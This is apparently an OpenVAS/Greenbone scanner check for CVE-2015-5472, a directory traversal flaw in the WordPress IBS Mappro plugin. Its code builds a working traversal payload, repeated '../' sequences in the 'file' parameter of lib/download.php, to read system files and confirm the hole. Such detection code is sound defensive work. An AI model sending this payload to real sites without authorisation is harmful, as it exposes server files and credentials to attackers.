CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.808201" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_cve_id( "CVE-2015-5472" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2016-05-20 16:09:30 +0530 (Fri, 20 May 2016)" );
	script_tag( name: "qod_type", value: "exploit" );
	script_name( "WordPress IBS Mappro Directory Traversal Vulnerability" );
	script_tag( name: "summary", value: "This host is installed with WordPress
  IBS Mappro plugin and is prone to directory traversal vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request
  and check whether it is able to read arbitrary files or not" );
	script_tag( name: "insight", value: "The flaw exists due to an improper sanitization
  of input to 'file' parameter in 'lib/download.php' file." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers
  to read arbitrary files." );
	script_tag( name: "affected", value: "WordPress IBS Mappro version 0.6 and previous" );
	script_tag( name: "solution", value: "Update to IBS Mappro version 1.0 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "https://wpvulndb.com/vulnerabilities/8091" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2016 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc", "os_detection.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "https://wordpress.org/plugins/ibs-mappro" );
	exit( 0 );
}
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
files = traversal_files();
for file in keys( files ) {
	url = dir + "/wp-content/plugins/ibs-mappro/lib/download.php?file=" + crap( data: "../", length: 3 * 15 ) + files[file];
	if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: file )){
		report = http_report_vuln_url( port: http_port, url: url );
		security_message( port: http_port, data: report );
		exit( 0 );
	}
}

